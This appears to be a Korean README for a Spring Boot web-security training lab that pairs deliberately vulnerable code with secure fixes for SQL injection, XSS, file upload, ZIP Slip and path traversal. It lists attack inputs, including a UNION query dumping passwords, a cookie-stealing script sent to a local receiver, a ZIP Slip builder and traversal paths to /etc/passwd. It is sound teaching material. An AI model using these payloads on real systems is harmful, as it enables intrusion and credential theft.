# 시큐어코딩 - 웹 보안 취약점 실습 환경 (Spring Boot)

---

## 실행 방법

### 사전 요구 사항

- Java 17+
- Maven 3.8+
- MySQL 8.0+

### 1. 데이터베이스 생성

```sql
mysql -u root -p
CREATE DATABASE techseminar CHARACTER SET utf8mb4;
```

`schema.sql` / `data.sql` 은 앱 시작 시 자동으로 실행됩니다.

### 2. DB 연결 설정 (필요 시 수정)

`src/main/resources/application.properties`

```properties
spring.datasource.url=jdbc:mysql://localhost:3306/techseminar?...
spring.datasource.username=root
spring.datasource.password=1234
```

### 3. 실행

```bash
mvn spring-boot:run
```

브라우저에서 `http://localhost:8080` 접속

### 테스트 계정

| 아이디 | 비밀번호 | 역할 |
|--------|----------|------|
| admin  | 1234     | 관리자 |
| alice  | 1234     | 일반 |
| bob    | 1234     | 일반 |
| melody | 1234     | 일반 |

---

## 취약점 데모

`http://localhost:8080/demo` 에서 전체 목록 확인 가능.

각 데모 페이지에서 공격 스크립트 옆 복사 버튼으로 클립보드에 복사할 수 있습니다.

---

### SQL Injection - `/demo/sql-injection`

| 구분 | 내용 |
|------|------|
| OWASP | A03:2021 - Injection |
| CWE | CWE-89 |
| 취약 코드 | 문자열 붙이기: `"... WHERE user_id = '" + userId + "'"` |
| 안전 코드 | PreparedStatement: `"... WHERE user_id = ?"` + 파라미터 바인딩 |

공격 예시

- 로그인 우회: ID = `admin' --` / PW = 아무거나
- 전체 조회: 검색어 = `%' OR '1'='1`
- 계정 탈취: `%' UNION SELECT 1,user_id,user_password,user_name,user_email,user_gender,0 FROM user_tb --`

---

### XSS (Cross-Site Scripting) - `/demo/xss`

| 구분 | 내용 |
|------|------|
| OWASP | A03:2021 - Injection |
| CWE | CWE-79 |
| 취약 코드 | `th:utext` - HTML 그대로 렌더링 |
| 안전 코드 | `th:text` - HTML 자동 인코딩 |

공격 예시

- 경고창 (Reflected): `<script>alert('XSS!')</script>`
- 쿠키 탈취 (Stored): `<script>fetch('http://localhost:8080/demo/steal?c='+document.cookie)</script>`
- 이미지 태그 우회: `<img src=x onerror="alert('XSS')">`

데모 유형

- Stored XSS: 댓글 입력 후 저장 - 이후 조회 시 모든 사용자에게 실행
- Reflected XSS: URL 파라미터 - 즉시 출력

---

### 쿠키 탈취 수신 - `/demo/steal`

XSS 공격으로 전송된 쿠키를 서버에서 수신하고 확인합니다.

- `?c=` 파라미터로 수신된 쿠키를 최대 20개 기록
- 목록 초기화 가능

---

### 파일 업로드 취약점 - `/demo/file-upload`

| 구분 | 내용 |
|------|------|
| OWASP | A04:2021 - Insecure Design |
| CWE | CWE-434, CWE-22 (ZIP Slip) |
| 취약 코드 | 확장자 검사 없음, 원본 파일명 그대로 저장 |
| 안전 코드 | 화이트리스트 검사 + UUID 랜덤 파일명 |

공격 파일 유형

| 파일 | 설명 |
|------|------|
| `webshell.jsp` | 서버 명령 실행 |
| `payload.svg` | 브라우저 XSS |
| `zipslip.zip` | 임의 경로 파일 쓰기 (ZIP Slip) |

ZIP Slip 악성 파일 생성 예시 (Python)

```python
import zipfile
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('../../uploads/pwned.txt', 'ZIP Slip success!')
zf.writestr('normal.txt', 'normal file')
zf.close()
```

ZIP Slip 취약/안전 해제 데모는 `/demo/file-upload` 하단에서 실습 가능합니다.

---

### 경로 순회 (Path Traversal) - `/demo/path-traversal`

| 구분 | 내용 |
|------|------|
| OWASP | A01:2021 - Broken Access Control |
| CWE | CWE-22 |
| 기준 경로 | `./safe-files/` |
| 취약 코드 | `safeFilesDir + "/" + filename` (검증 없음) |
| 안전 코드 | `normalize()` + `startsWith(basePath)` 로 탈출 감지 |

공격 예시

- `../src/main/resources/application.properties` - DB 비밀번호 노출
- `../../pom.xml` - 프로젝트 구조 노출
- `../../../Windows/win.ini` - Windows 시스템 파일
- `../../../etc/passwd` - Linux 계정 정보

---

## 보안약점 목록

| CWE | 취약점 | 데모 위치 |
|-----|--------|-----------|
| CWE-89 | SQL Injection | `/demo/sql-injection` |
| CWE-79 | XSS - Stored / Reflected | `/demo/xss` |
| CWE-434 | 위험한 형식 파일 업로드 | `/demo/file-upload` |
| CWE-22 | 경로 순회 (Path Traversal) | `/demo/path-traversal` |
| CWE-22 | ZIP Slip | `/demo/file-upload` (하단) |

---

## 기술 스택

| 항목 | 버전 |
|------|------|
| Java | 17 |
| Spring Boot | 3.2.3 |
| Thymeleaf | 3.x |
| Spring JDBC | - |
| Spring Security | 6.x |
| MySQL | 8.0+ |
| Bootstrap | 5.3 (CDN) |

---

## 프로젝트 구조

```
src/main/java/com/techseminar/
├── config/
│   └── SecurityConfig.java
├── controller/
│   ├── AuthController.java          로그인 / 로그아웃 / 회원가입
│   ├── BbsController.java           게시판 CRUD + 검색
│   ├── HomeController.java
│   └── demo/
│       ├── SqlInjectionController.java
│       ├── XssController.java
│       ├── CookieStealController.java
│       ├── FileUploadDemoController.java
│       └── PathTraversalController.java
├── model/
│   ├── User.java
│   ├── Bbs.java
│   └── FileInfo.java
└── service/
    ├── UserService.java             loginVulnerable / loginSecure
    ├── BbsService.java              searchVulnerable / searchSecure
    └── FileService.java             uploadVulnerable / uploadSecure
                                     extractVulnerable / extractSecure (ZIP Slip)

src/main/resources/
├── application.properties
├── schema.sql
├── data.sql
├── static/style.css
└── templates/
    ├── index.html
    ├── auth/
    ├── bbs/
    └── demo/                        index, sql-injection, xss, file-upload, path-traversal, cookie-steal

safe-files/                          경로 순회 데모용 기준 디렉토리
```
